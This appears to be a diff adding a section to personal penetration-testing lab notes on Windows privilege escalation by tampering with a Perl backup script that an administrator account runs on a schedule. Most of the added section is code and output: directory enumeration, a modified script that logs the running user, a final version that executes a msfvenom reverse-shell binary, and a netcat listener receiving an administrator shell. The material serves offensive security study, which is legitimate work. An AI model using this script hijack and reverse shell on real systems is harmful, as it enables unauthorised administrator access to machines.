@@ -1489,6 +1489,151 @@ C:\Windows\system32>fodhelper.exe #victim machine
 whoami /groups
 Mandatory Label\High Mandatory Level       Label            S-1-16-12288 
 ````
+### Scripts being run by administrator
+````
+typically this exploit will require manual enumeration. I was able to find a directory called C:\backup\Scripts\<vulnerable script>
+````
+````
+C:\backup\Scripts>dir /q
+dir /q
+ Volume in drive C has no label.
+ Volume Serial Number is 7C9E-C9E6
+
+ Directory of C:\backup\Scripts
+
+04/15/2023  07:20 PM    <DIR>          JAMES\james            .
+04/15/2023  07:20 PM    <DIR>          JAMES\james            ..
+04/15/2023  07:20 PM                 0 JAMES\james            '
+04/15/2023  07:29 PM               782 BUILTIN\Administrators backup_perl.pl
+05/02/2019  05:34 AM               229 BUILTIN\Administrators backup_powershell.ps1
+05/02/2019  05:31 AM               394 BUILTIN\Administrators backup_python.py
+               4 File(s)          1,405 bytes
+               2 Dir(s)   4,792,877,056 bytes free
+````
+````
+type backup_perl.pl
+#!/usr/bin/perl
+
+use File::Copy;
+
+my $dir = 'C:\Users\Administrator\Work';
+
+# Print the current user
+system('whoami');
+
+opendir(DIR, $dir) or die $!;
+
+while (my $file = readdir(DIR)) {
+    # We only want files
+    next unless (-f "$dir/$file");
+
+    $filename =  "C:\\Users\\Administrator\\Work\\$file";
+    $output = "C:\\backup\\perl\\$file";
+    copy($filename, $output);
+}
+
+closedir(DIR);
+
+$time = localtime(time);
+$log = "Backup performed using Perl at: $time\n";
+open($FH, '>>', "C:\\backup\\JamesWork\\log.txt") or die $!;
+print $FH $log;
+close($FH);
+````
+#### Testing for exploit
+````
+#!/usr/bin/perl
+
+use File::Copy;
+
+my $dir = 'C:\Users\Administrator\Work';
+
+# Get the current user
+my $user = `whoami`;
+chomp $user;
+
+# Print the current user to the console
+print "Current user: $user\n";
+
+opendir(DIR, $dir) or die $!;
+
+while (my $file = readdir(DIR)) {
+    # We only want files
+    next unless (-f "$dir/$file");
+
+    $filename =  "C:\\Users\\Administrator\\Work\\$file";
+    $output = "C:\\backup\\perl\\$file";
+    copy($filename, $output);
+}
+
+closedir(DIR);
+
+$time = localtime(time);
+$log = "Backup performed using Perl at: $time\n";
+$log .= "Current user: $user\n";
+open($FH, '>>', "C:\\backup\\JamesWork\\log.txt") or die $!;
+print $FH $log;
+close($FH);
+````
+##### Results
+````
+Current user: james\administrator
+Backup performed using Python at : 2023-04-15T19:28:41.597000
+Backup performed using Python at : 2023-04-15T19:31:41.606000
+Backup performed using Python at : 2023-04-15T19:34:41.661000
+````
+#### Exploit
+````
+use the msfvenom shell you used to get initial access to elevate privs with this script
+````
+````
+#!/usr/bin/perl
+
+use File::Copy;
+
+my $dir = 'C:\Users\Administrator\Work';
+
+# Get the current user
+my $user = `whoami`;
+chomp $user;
+
+# Print the current user to the console
+print "Current user: $user\n";
+
+# Execute cmd /c C:\\Users\james\Desktop\shell.exe
+exec('cmd /c C:\\Users\james\\Desktop\\shell.exe');
+
+opendir(DIR, $dir) or die $!;
+
+while (my $file = readdir(DIR)) {
+    # We only want files
+    next unless (-f "$dir/$file");
+
+    $filename =  "C:\\Users\\Administrator\\Work\\$file";
+    $output = "C:\\backup\\perl\\$file";
+    copy($filename, $output);
+}
+
+closedir(DIR);
+
+$time = localtime(time);
+$log = "Backup performed using Perl at: $time\n";
+$log .= "Current user: $user\n";
+open($FH, '>>', "C:\\backup\\JamesWork\\log.txt") or die $!;
+print $FH $log;
+close($FH);
+````
+````
+nc -nlvp 443 
+listening on [any] 443 ...
+connect to [192.168.119.184] from (UNKNOWN) [10.11.1.252] 10209
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+james\administrator
+````
 ### Leveraging Unquoted Service Paths
 Another interesting attack vector that can lead to privilege escalation on Windows operating systems revolves around unquoted service paths.1 We can use this attack when we have write permissions to a service's main directory and subdirectories but cannot replace files within them. Please note that this section of the module will not be reproducible on your dedicated client. However, you will be able to use this technique on various hosts inside the lab environment.
 
